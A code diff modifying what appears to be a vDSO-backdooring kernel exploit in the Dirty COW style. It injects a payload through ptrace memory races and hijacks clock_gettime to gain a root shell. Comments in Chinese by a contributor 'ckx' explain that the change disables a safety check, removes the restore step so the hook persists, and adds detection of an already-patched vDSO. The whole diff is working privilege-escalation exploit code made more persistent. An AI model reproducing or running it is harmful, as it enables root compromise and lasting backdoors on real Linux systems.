@@ -86,7 +86,12 @@ static struct prologue prologues[] = {
 	{ "\x55\x48\x89\xe5\x66\x66\x90", 7 },
 	/* push rbp; cmp edi, 1; mov rbp, rsp */
 	{ "\x55\x83\xff\x01\x48\x89\xe5", 7 },
+	// { "\xe8", 1 },
 };
+//ckx: todo
+static struct prologue ckxprologue;
+static unsigned char ckxprelog[12];
+
 
 static int writeall(int fd, const void *buf, size_t count)
 {
@@ -120,6 +125,8 @@ static int ptrace_memcpy(pid_t pid, void *dest, const void *src, size_t n)
 	const unsigned char *s;
 	unsigned long value;
 	unsigned char *d;
+
+
 
 	d = dest;
 	s = src;
@@ -235,17 +242,22 @@ static int build_vdso_patch(void *vdso_addr, struct prologue *prologue)
 	clock_gettime_addr = (unsigned long)vdso_addr + clock_gettime_offset;
 
 	/* patch #1: put payload at the end of vdso */
+	//ckx: vdso_patch[0] 是去race写的payload字节，在exploit之前准备好这个vdso_patch列表就会帮我们去把想要的内容改进去
 	vdso_patch[0].patch = payload;
 	vdso_patch[0].size = payload_len;
 	vdso_patch[0].addr = (unsigned char *)vdso_addr + VDSO_SIZE - payload_len;
+	
 
 	p = vdso_patch[0].addr;
-	for (i = 0; i < payload_len; i++) {
-		if (p[i] != '\x00') {
-			fprintf(stderr, "failed to find a place for the payload\n");
-			return -1;
-		}
-	}
+	//ckx: patch 这里不做覆盖位置的检查 ， 但是依然还要过第一个检查
+	// for (i = 0; i < payload_len; i++) {
+	// 	if (p[i] != '\x00') {
+	// 		fprintf(stderr, "failed to find a place for the payload\n");
+			
+	// 		return -1;
+	// 	}
+	// }
+
 
 	/* patch #2: hijack clock_gettime prologue */
 	buf = malloc(sizeof(PATTERN_PROLOGUE)-1);
@@ -255,11 +267,14 @@ static int build_vdso_patch(void *vdso_addr, struct prologue *prologue)
 	}
 
 	/* craft call to payload */
+	//ckx: clock_gettime_offset 将是我们patch一小段代码的位置，而payload则是放在vdso的末尾，payload执行完以后，还会跳回clock_gettime_offset 回来
 	target = VDSO_SIZE - payload_len - clock_gettime_offset;
 	memset(buf, '\x90', sizeof(PATTERN_PROLOGUE)-1);
 	buf[0] = '\xe8';
-	*(uint32_t *)&buf[1] = target - 5;
+	// buf[0] = '\x90';
 
+	*(uint32_t *)&buf[1] = target - 5;
+	//ckx: vdso_patch[1] 是patch一小段的几个字节 ； vdso_patch[0]则是payload一大段字节
 	vdso_patch[1].patch = buf;
 	vdso_patch[1].size = prologue->size;
 	vdso_patch[1].addr = (unsigned char *)clock_gettime_addr;
@@ -366,7 +381,9 @@ static void *ptrace_thread(void *arg_)
 		if (arg->do_patch)
 			ret2 = backdoor_vdso(pid, arg->patch_number);
 		else
-			ret2 = restore_vdso(pid, arg->patch_number);
+			// ret2 = restore_vdso(pid, arg->patch_number);
+			;
+			
 
 		if (ret2 == -1) {
 			ret = NULL;
@@ -523,9 +540,11 @@ static int yeah(struct mem_arg *arg, int s)
 	fprintf(stderr, "[*] enjoy!\n");
 
 	if (fork() == 0) {
-		if (exploit(arg, false) == -1)
-			fprintf(stderr, "[-] failed to restore vDSO\n");
-		exit(0);
+		// ckx：放弃掉restore，让它一直hook
+		// if (exploit(arg, false) == -1)
+		// 	fprintf(stderr, "[-] failed to restore vDSO\n");
+		// exit(0);
+		;
 	}
 
 	fds[0].fd = STDIN_FILENO;
@@ -587,13 +606,76 @@ static struct prologue *fingerprint_prologue(void *vdso_addr)
 	entry_point = *(uint64_t *)((unsigned char *)vdso_addr + 0x18);
 	clock_gettime_offset = (uint32_t)entry_point & 0xfff;
 	clock_gettime_addr = (unsigned long)vdso_addr + clock_gettime_offset;
-
+	// printf("ckx: %s",clock_gettime_addr);
+	// printf ("AAA");
 	for (i = 0; i < ARRAY_SIZE(prologues); i++) {
 		p = &prologues[i];
 		if (memcmp((void *)clock_gettime_addr, p->opcodes, p->size) == 0)
 			return p;
 	}
 
+	//ckx: 检验是否已经被pwn
+	// todo
+	char ckxflag[10] = "\xe8";
+	if (memcmp((void *)clock_gettime_addr, ckxflag, 1) == 0){
+
+		unsigned char ckxtest[12];
+		memcpy(ckxtest,(unsigned long)vdso_addr + clock_gettime_offset,12);
+		for (size_t ii = 0; ii < 12; ii++)
+		{
+			printf("char in pre: %x\n", ckxtest[ii]);
+			// char unitckx = ckxprelog[i];
+
+
+		}
+
+
+
+		unsigned char ip[12];
+
+		memcpy(ip, (unsigned char *)vdso_addr + VDSO_SIZE - payload_len + 133,12);
+		for (size_t ii = 0; ii < 12; ii++)
+		{
+			printf("ip in char: %x\n", ip[ii]);
+			// char unitckx = ckxprelog[i];
+		}
+
+		unsigned char ckxpayload[265];
+		// unsigned char ckxprelog[12];
+		memcpy(ckxprelog, (unsigned char *)vdso_addr + VDSO_SIZE - payload_len+212,12);
+
+		size_t jishu = 0;
+
+
+		for (size_t i = 0; i < 12; i++) {
+			printf("char: %x\n",ckxprelog[i]);
+			char unitckx = ckxprelog[i];
+			if (unitckx == '\x90') {
+
+				ckxprelog[i] = '\x00';
+				jishu = i;
+				printf("found one\n");
+				break;
+			}
+		}
+		// ckxprelog[1] ='\x48';
+
+
+		ckxprologue.opcodes = ckxprelog;
+
+		ckxprologue.size = jishu;
+		printf("ckx: prologue size = %d\n",jishu);
+
+		p = &ckxprologue;
+		printf("ckx: return ckxprologue!!\n");
+		return p;
+
+			// memcpy(ckxpayload, (unsigned char *)vdso_addr + VDSO_SIZE - payload_len, 256);
+		// ckxpay[212]
+
+		;
+	}
+		printf("ckx: not found something!!\n");
 	return NULL;
 }
 
